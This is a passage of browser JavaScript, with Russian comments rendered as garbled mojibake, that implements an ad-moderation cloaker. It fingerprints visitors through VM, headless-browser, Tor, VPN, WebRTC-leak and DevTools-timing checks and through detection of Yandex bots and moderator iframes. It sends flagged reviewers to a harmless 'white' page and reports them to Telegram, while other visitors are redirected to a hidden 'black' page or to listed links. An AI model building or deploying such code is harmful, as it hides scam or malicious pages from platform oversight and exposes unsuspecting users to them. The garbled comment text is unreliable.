            return isBlocked;
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –º–∞—à–∏–Ω—ã
         */
        function checkForVirtualMachine() {
            if (!config.experimental.CheckVirtualMachine) return false;
            logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ VM...");
            let isVM = false;

            if (isRegularYandexUser()) {
                logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ VM –ø—Ä–æ–ø—É—â–µ–Ω–∞ –¥–ª—è Yandex User");
                return false;
            }

            // –ù–∏–∑–∫–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä/–ø–∞–º—è—Ç—å
            if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 1) { isVM = true; logDebug("VM: –ù–∏–∑–∫–æ–µ hardwareConcurrency"); }
            if (navigator.deviceMemory && navigator.deviceMemory <= 1) { isVM = true; logDebug("VM: –ù–∏–∑–∫–∞—è deviceMemory"); }

            // –ü–∞—Ç—Ç–µ—Ä–Ω—ã –≤ User-Agent
            if (/VMware|VirtualBox/i.test(userAgent)) { isVM = true; logDebug("VM: UA —Å–æ–¥–µ—Ä–∂–∏—Ç VMware/VirtualBox"); }

            // –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É WebGL renderer info, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
            // const canvas = document.createElement('canvas');
            // const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            // if (gl) {
            //     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            //     if (debugInfo) {
            //         const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            //         if (renderer && /llvmpipe|swiftshader|virtualbox|vmware/i.test(renderer)) {
            //             isVM = true; logDebug(`VM: –ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π WebGL renderer: ${renderer}`);
            //         }
            //     }
            // }

            logDebug(`checkForVirtualMachine: ${isVM}`);
            return isVM;
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ç–∏ Tor
         */
        async function checkTorNetwork() {
            if (!config.experimental.CheckTorNetwork) return false;
            logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ Tor...");

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ –≤–Ω–µ—à–Ω–∏–π —Å–µ—Ä–≤–∏—Å (–∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ)
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç
                const response = await fetch('https://check.torproject.org/api/ip', { signal: controller.signal });
                clearTimeout(timeoutId);
                if (response.ok) {
                    const data = await response.json();
                    if (data.IsTor === true) {
                        logDebug("checkTorNetwork: true (–ø–æ API torproject)");
                        return true;
                    }
                }
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ Tor —á–µ—Ä–µ–∑ API:", e.name === 'AbortError' ? 'Timeout' : e);
            }

            // –†–µ–∑–µ—Ä–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –ø—Ä–∏–∑–Ω–∞–∫–∞–º –±—Ä–∞—É–∑–µ—Ä–∞ Tor (–∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ)
            if (/Tor/i.test(userAgent) || (navigator.plugins && navigator.plugins.length === 0 && window.screen.width === 1000 && window.screen.height === 1000)) {
                logDebug("checkTorNetwork: true (–ø–æ –ø—Ä–∏–∑–Ω–∞–∫–∞–º –±—Ä–∞—É–∑–µ—Ä–∞)");
                return true;
            }

            logDebug("checkTorNetwork: false");
            return false;
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—Ä–æ–∫—Å–∏ –∏–ª–∏ VPN (—Ç—Ä–µ–±—É–µ—Ç API –∫–ª—é—á –∏–ª–∏ –ø–ª–∞—Ç–Ω—ã–π —Å–µ—Ä–≤–∏—Å –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏)
         * –ò—Å–ø–æ–ª—å–∑—É–µ–º ipqualityscore –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ, –Ω–æ –æ–Ω –º–æ–∂–µ—Ç —Ç—Ä–µ–±–æ–≤–∞—Ç—å –∫–ª—é—á.
         * –ë–µ–∑ –∫–ª—é—á–∞ –µ–≥–æ —Ç–æ—á–Ω–æ—Å—Ç—å –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–∏–∑–∫–æ–π.
         */
        async function detectProxiesOrVPN() {
            if (!config.experimental.CheckVPN) return false;
            logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ Proxy/VPN...");
            const currentIp = userInfo?.ipAddress;
            if (!currentIp || currentIp === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") return false;

            // !!! –í–ê–ñ–ù–û: ipqualityscore –º–æ–∂–µ—Ç —Ç—Ä–µ–±–æ–≤–∞—Ç—å API –∫–ª—é—á –¥–ª—è —Ç–æ—á–Ω–æ–π —Ä–∞–±–æ—Ç—ã !!!
            // –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –Ω–µ—Ç–æ—á–Ω—ã–º–∏ –∏–ª–∏ –∏–º–µ—Ç—å –ª–∏–º–∏—Ç—ã.
            const apiKey = "YOUR_IPQUALITYSCORE_API_KEY"; // <-- –í—Å—Ç–∞–≤—å—Ç–µ –≤–∞—à –∫–ª—é—á —Å—é–¥–∞, –µ—Å–ª–∏ –µ—Å—Ç—å
            const apiUrl = `https://ipqualityscore.com/api/json/ip/${apiKey}/${currentIp}?strictness=0&lightweight=true&mobile=true`;

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç
                const response = await fetch(apiUrl, { signal: controller.signal });
                 clearTimeout(timeoutId);

                if (response.ok) {
                    const data = await response.json();
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥–∏, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—ã–µ API
                    const isProxy = data.proxy || data.vpn || data.tor;
                    logDebug(`detectProxiesOrVPN: ${isProxy} (proxy: ${data.proxy}, vpn: ${data.vpn}, tor: ${data.tor})`);
                    return isProxy;
                } else {
                     logDebug(`–û—à–∏–±–∫–∞ API ipqualityscore: ${response.status}`);
                }
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø—Ä–æ–∫—Å–∏/VPN —á–µ—Ä–µ–∑ API:", e.name === 'AbortError' ? 'Timeout' : e);
            }

            logDebug("detectProxiesOrVPN: false (–æ—à–∏–±–∫–∞ –∏–ª–∏ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ)");
            return false;
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞ WebRTC –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è VPN (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
         */
        async function checkWebRTCLeakage() {
            if (!config.experimental.CheckWebRTCLeakage) return false;
            logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Ç–µ—á–∫–∏ WebRTC...");

            return new Promise(async (resolve) => {
                const publicIp = userInfo?.ipAddress; // –ò—Å–ø–æ–ª—å–∑—É–µ–º —É–∂–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π IP
                if (!publicIp || publicIp === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") {
                    logDebug("WebRTC: –ü—É–±–ª–∏—á–Ω—ã–π IP –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω.");
                    return resolve(false);
                }

                let foundLeak = false;
                try {
                    if (typeof RTCPeerConnection === 'undefined') {
                         logDebug("WebRTC: RTCPeerConnection –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è.");
                         return resolve(false);
                    }

                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('');

                    // –¢–∞–π–º–µ—Ä –Ω–∞ —Å–ª—É—á–∞–π, –µ—Å–ª–∏ onicecandidate –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç
                    const timeoutId = setTimeout(() => {
                        if (!foundLeak) {
                            logDebug("WebRTC: –¢–∞–π–º–∞—É—Ç –æ–∂–∏–¥–∞–Ω–∏—è ICE candidate.");
                            pc.close();
                            resolve(false);
                        }
                    }, 2000); // 2 —Å–µ–∫—É–Ω–¥—ã –æ–∂–∏–¥–∞–Ω–∏—è

                    pc.onicecandidate = (ice) => {
                        if (foundLeak) return; // –£–∂–µ –Ω–∞—à–ª–∏ —É—Ç–µ—á–∫—É, –Ω–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –¥–∞–ª—å—à–µ

                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            // –ö–∞–Ω–¥–∏–¥–∞—Ç—ã –∑–∞–∫–æ–Ω—á–∏–ª–∏—Å—å –∏–ª–∏ –ø—É—Å—Ç–æ–π –∫–∞–Ω–¥–∏–¥–∞—Ç
                            if (!foundLeak) {
                                clearTimeout(timeoutId);
                                pc.close();
                                resolve(false); // –£—Ç–µ—á–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ
                            }
                            return;
                        }

                        // –ò—â–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–π IP –≤ –∫–∞–Ω–¥–∏–¥–∞—Ç–µ
                        const localIpMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+:+[a-f0-9]+)/.exec(ice.candidate.candidate);
                        if (localIpMatch && localIpMatch.length > 1) {
                            const localIp = localIpMatch[1];
                            // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ –∏ –∞–¥—Ä–µ—Å–∞ —Å–∞–º–æ–≥–æ —Å–µ–±—è
                            if (localIp !== publicIp &&
                                !localIp.startsWith('192.168.') &&
                                !localIp.startsWith('10.') &&
                                !localIp.startsWith('172.') && // –ë–æ–ª–µ–µ –ø–æ–ª–Ω—ã–π –¥–∏–∞–ø–∞–∑–æ–Ω —á–∞—Å—Ç–Ω—ã—Ö —Å–µ—Ç–µ–π
                                !localIp.startsWith('169.254.') && // Link-local
                                !localIp.startsWith('fe80:') && // IPv6 Link-local
                                !localIp.startsWith('::1'))    // IPv6 Loopback
                            {
                                logDebug(`WebRTC: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—Ç–µ—á–∫–∞! –ü—É–±–ª–∏—á–Ω—ã–π IP: ${publicIp}, –õ–æ–∫–∞–ª—å–Ω—ã–π IP: ${localIp}`);
                                foundLeak = true;
                                clearTimeout(timeoutId);
                                pc.close();
                                resolve(true); // –ù–∞–π–¥–µ–Ω–∞ —É—Ç–µ—á–∫–∞
                            }
                        }
                    };

                    // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å —Å–±–æ—Ä–∞ –∫–∞–Ω–¥–∏–¥–∞—Ç–æ–≤
                    pc.createOffer()
                      .then(offer => pc.setLocalDescription(offer))
                      .catch(err => {
                          logDebug("WebRTC: –û—à–∏–±–∫–∞ createOffer/setLocalDescription:", err);
                          clearTimeout(timeoutId);
                          pc.close();
                          resolve(false);
                      });

                } catch (e) {
                    logDebug("WebRTC: –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:", e);
                    resolve(false); // –°—á–∏—Ç–∞–µ–º, —á—Ç–æ —É—Ç–µ—á–∫–∏ –Ω–µ—Ç –ø—Ä–∏ –æ—à–∏–±–∫–µ
                }
            });
        }

        /**
         * –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ç–∞–π–º–∏–Ω–≥-–∞—Ç–∞–∫ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–∞ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
         */
        function performTimingAttacks() {
            if (!config.experimental.PerformTimingAttacks) return false;
            logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–∞–π–º–∏–Ω–≥-–∞—Ç–∞–∫–æ–π...");

            if (isRegularYandexUser()) {
                 logDebug("–¢–∞–π–º–∏–Ω–≥-–∞—Ç–∞–∫–∞ –ø—Ä–æ–ø—É—â–µ–Ω–∞ –¥–ª—è Yandex User");
                 return false;
            }

            let isDebugging = false;
            try {
                const start = performance.now();
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º console.debug –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
                for (let i = 0; i < 1000; i++) {
                    console.debug('');
                }
                console.clear();
                const end = performance.now();
                const duration = end - start;

                // –ü–æ—Ä–æ–≥ –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞ - 20–º—Å
                if (duration > 20) {
                    isDebugging = true;
                    logDebug(`performTimingAttacks: true (–≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: ${duration.toFixed(1)}ms)`);
                } else {
                    logDebug(`performTimingAttacks: false (–≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: ${duration.toFixed(1)}ms)`);
                }
            } catch(e) { /* –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –∫–æ–Ω—Å–æ–ª–∏ */ }

            return isDebugging;
        }


        // ===== –û–°–ù–û–í–ù–ê–Ø –õ–û–ì–ò–ö–ê =====

        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∏—Ç–æ–≥–æ–≤–æ–≥–æ URL –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è
        async function determineRedirectTarget() {
            // –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –≤—ã–∑–æ–≤, –µ—Å–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç —É–∂–µ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω
            if (redirectInitiated) {
                logDebug("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ü–µ–ª–∏ –ø—Ä–µ—Ä–≤–∞–Ω–æ: —Ä–µ–¥–∏—Ä–µ–∫—Ç —É–∂–µ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω.");
                return null; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º null, —á—Ç–æ–±—ã –Ω–µ –≤—ã–∑—ã–≤–∞—Ç—å redirect() —Å–Ω–æ–≤–∞
            }
            logDebug("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ü–µ–ª–µ–≤–æ–≥–æ URL...");
            let targetUrl = BLACK_PAGE; // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é - —á–µ—Ä–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
            blockReason = ''; // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –ø—Ä–∏—á–∏–Ω—É –ø–µ—Ä–µ–¥ –Ω–æ–≤–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π

            try {
                // 1. –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏ —Å—Ç–∞—Ç—É—Å–∞ (–¥–µ–ª–∞–µ–º —ç—Ç–æ –æ–¥–∏–Ω —Ä–∞–∑)
                if (!determineRedirectTarget.configLoaded) {
                    const configText = await loadFile('config.txt');
                    parseConfig(configText); // –ü—Ä–∏–º–µ–Ω—è–µ–º –∫–æ–Ω—Ñ–∏–≥
                    const onOffText = await loadFile('onoff.txt');
                    onOffState = onOffText ? onOffText.trim().toLowerCase() : 'on';
                    logDebug(`–°—Ç–∞—Ç—É—Å onoff.txt: ${onOffState}`);
                    determineRedirectTarget.configLoaded = true; // –§–ª–∞–≥, —á—Ç–æ –∑–∞–≥—Ä—É–∑–∏–ª–∏
                }

                // 2. –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ (–µ—Å–ª–∏ –µ—â–µ –Ω–µ —Å–æ–±—Ä–∞–Ω–∞)
                if (!userInfo) {
                    await collectUserInfo();
                }

                // 3. –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ (–≤ –ø–æ—Ä—è–¥–∫–µ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞)
                const deviceConfig = isMobile ? config.mobile : config.desktop;

                // --- –û—Å–Ω–æ–≤–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ ---
                if (botTrapActivated) { blockReason = "–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –ª–æ–≤—É—à–∫–∞ –¥–ª—è –±–æ—Ç–æ–≤"; }
                else if (deviceConfig.CheckIpBlacklist && await isIpBlocked()) { blockReason = "IP –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ"; }
                else if (deviceConfig.CheckSearchBots && isSearchBotUA()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–∏—Å–∫–æ–≤—ã–π –±–æ—Ç (UA)"; }
                else if (deviceConfig.CheckYandexBot && await isYandexBot()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω –±–æ—Ç/–º–æ–¥–µ—Ä–∞—Ç–æ—Ä –Ø–Ω–¥–µ–∫—Å–∞"; }
                else if (deviceConfig.CheckHeadlessBrowser && isHeadlessBrowser()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω headless –±—Ä–∞—É–∑–µ—Ä"; }
                else if (deviceConfig.CheckYandexModerator && hasYandexModeratorIframe()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏"; }
                else if (deviceConfig.CheckVisitFrequency && isBlockedByFrequency()) { blockReason = "–ü—Ä–µ–≤—ã—à–µ–Ω–∞ —á–∞—Å—Ç–æ—Ç–∞ –ø–æ—Å–µ—â–µ–Ω–∏–π"; }
                else if (deviceConfig.CheckDevTools && isLikelyModerator()) { blockReason = "–ü–æ–¥–æ–∑—Ä–µ–Ω–∏–µ –Ω–∞ DevTools/–ú–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞"; }
                // --- –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è –æ—Ç–¥–µ–ª—å–Ω–æ —Ç–∞–π–º–∞—É—Ç–æ–º ---

                // --- –≠–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ (–µ—Å–ª–∏ –æ—Å–Ω–æ–≤–Ω—ã–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏) ---
                else if (config.experimental.CheckAdBlocker && detectAdblocker()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω AdBlock"; }
                else if (config.experimental.CheckVirtualMachine && checkForVirtualMachine()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ VM"; }
                else if (config.experimental.CheckTorNetwork && await checkTorNetwork()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Å–µ—Ç—å Tor"; }
                else if (config.experimental.CheckVPN && await detectProxiesOrVPN()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω Proxy/VPN"; }
                else if (config.experimental.CheckWebRTCLeakage && await checkWebRTCLeakage()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—Ç–µ—á–∫–∞ WebRTC (VPN?)"; }
                else if (config.experimental.PerformTimingAttacks && performTimingAttacks()) { blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫ (—Ç–∞–π–º–∏–Ω–≥-–∞—Ç–∞–∫–∞)"; }


                // 4. –ï—Å–ª–∏ –ø—Ä–∏—á–∏–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –Ω–∞–π–¥–µ–Ω–∞ -> WHITE_PAGE
                if (blockReason) {
                    logDebug(`–†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ WHITE_PAGE. –ü—Ä–∏—á–∏–Ω–∞: ${blockReason}`);
                    targetUrl = WHITE_PAGE;
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø—Ä–∏—á–∏–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞
                    await sendTelegramReport(blockReason, userInfo);
                } else {
                    // 5. –ï—Å–ª–∏ –≤—Å–µ —á–∏—Å—Ç–æ -> BLACK_PAGE –∏–ª–∏ —Å—Å—ã–ª–∫–∞ –∏–∑ links.txt
                    logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ–π–¥–µ–Ω—ã. –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ BLACK_PAGE –∏–ª–∏ links.txt.");
                    const codeParam = getUrlParameter('code');
                    if (codeParam) {
                        logDebug(`–ù–∞–π–¥–µ–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä code=${codeParam}. –ó–∞–≥—Ä—É–∑–∫–∞ links.txt...`);
                        try {
                            const linksText = await loadFile('links.txt');
                            if (linksText) {
                                const links = linksText.split('\n').map(link => link.trim()).filter(link => link);
                                const codeNumber = parseInt(codeParam);
                                if (!isNaN(codeNumber) && codeNumber > 0 && codeNumber <= links.length) {
                                    targetUrl = links[codeNumber - 1];
                                    logDebug(`–í—ã–±—Ä–∞–Ω–∞ —Å—Å—ã–ª–∫–∞ ‚Ññ${codeNumber}: ${targetUrl}`);
                                } else {
                                    const randomIndex = Math.floor(Math.random() * links.length);
                                    targetUrl = links[randomIndex];
                                    logDebug(`–ù–µ–≤–µ—Ä–Ω—ã–π code=${codeParam}. –í—ã–±—Ä–∞–Ω–∞ —Å–ª—É—á–∞–π–Ω–∞—è —Å—Å—ã–ª–∫–∞ ‚Ññ${randomIndex + 1}: ${targetUrl}`);
                                }
                            } else {
                                logDebug("–§–∞–π–ª links.txt –ø—É—Å—Ç –∏–ª–∏ –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è BLACK_PAGE.");
                                targetUrl = BLACK_PAGE;
                            }
                        } catch (e) {
                            logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ links.txt, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è BLACK_PAGE:", e);
                            targetUrl = BLACK_PAGE;
                        }
                    } else {
                         logDebug("–ü–∞—Ä–∞–º–µ—Ç—Ä code –Ω–µ –Ω–∞–π–¥–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è BLACK_PAGE.");
                         targetUrl = BLACK_PAGE;
                    }
                }

            } catch (error) {
                console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ —Ü–µ–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞:", error);
                logDebug("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:", error);
                targetUrl = WHITE_PAGE; // –í —Å–ª—É—á–∞–µ –ª—é–±–æ–π –æ—à–∏–±–∫–∏ - –Ω–∞ –±–µ–ª—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
                blockReason = `–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞: ${error.message}`; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∏—á–∏–Ω—É
                try {
                    // –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á–µ—Ç –æ–± –æ—à–∏–±–∫–µ
                    await sendTelegramReport(blockReason, userInfo || { deviceType: isMobile ? '–ú–æ–±' : '–ü–ö', error: 'UserInfo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω' });
                } catch (e) { console.error("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á–µ—Ç –æ–± –æ—à–∏–±–∫–µ:", e); }
            }

            return targetUrl;
        }
        determineRedirectTarget.configLoaded = false; // –°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π —Ñ–ª–∞–≥ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏

        // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ü–µ–ª–µ–≤—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
        function redirect(url) {
            // –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –≤—ã–∑–æ–≤ –∏–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç –±–µ–∑ URL
            if (redirectInitiated || !url) {
                 logDebug(`–†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ "${url}" –ø—Ä–µ—Ä–≤–∞–Ω (—É–∂–µ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω: ${redirectInitiated}, URL –ø—É—Å—Ç: ${!url})`);
                 return;
            }
            redirectInitiated = true;
            logDebug(`–ò–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞: ${url}`);

            // –£–±–∏—Ä–∞–µ–º –±–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –ª–æ–∞–¥–µ—Ä –ø–µ—Ä–µ–¥ —Ä–µ–¥–∏—Ä–µ–∫—Ç–æ–º
            if (humanVerificationBlock) humanVerificationBlock.classList.add('hidden');
            const loaderContainer = document.querySelector('.loader-container');
            if (loaderContainer) loaderContainer.style.display = 'none';


            const delay = isMobile ? config.mobile.RedirectDelay : config.desktop.RedirectDelay;
            logDebug(`–ó–∞–¥–µ—Ä–∂–∫–∞ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞: ${delay} –º—Å`);

            setTimeout(() => {
                try {
                    pageFullyLoaded = true; // –§–ª–∞–≥ –¥–ª—è beforeunload
                    window.location.href = url;
                } catch (e) {
                    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (window.location.href):", e);
                    // –ü–æ–ø—ã—Ç–∫–∞ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ –¥—Ä—É–≥–∏–º —Å–ø–æ—Å–æ–±–æ–º
                    try {
                        logDebug("–ü–æ–ø—ã—Ç–∫–∞ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ —á–µ—Ä–µ–∑ window.location.replace...");
                        window.location.replace(url);
                     } catch (e2) {
                        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (window.location.replace):", e2);
                     }
                }
            }, delay);
        }

        // ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –°–û–ë–´–¢–ò–ô –ò –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø =====

        // --- –†–∞–Ω–Ω—è—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—á–µ–≤–∏–¥–Ω—ã—Ö –±–æ—Ç–æ–≤ –ø–æ UA ---
        if (isSearchBotUA() && (config.desktop.CheckSearchBots || config.mobile.CheckSearchBots)) {
            logDebug("–û–±–Ω–∞—Ä—É–∂–µ–Ω –±–æ—Ç –ø–æ UA –¥–æ DOMContentLoaded. –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ WHITE_PAGE.");
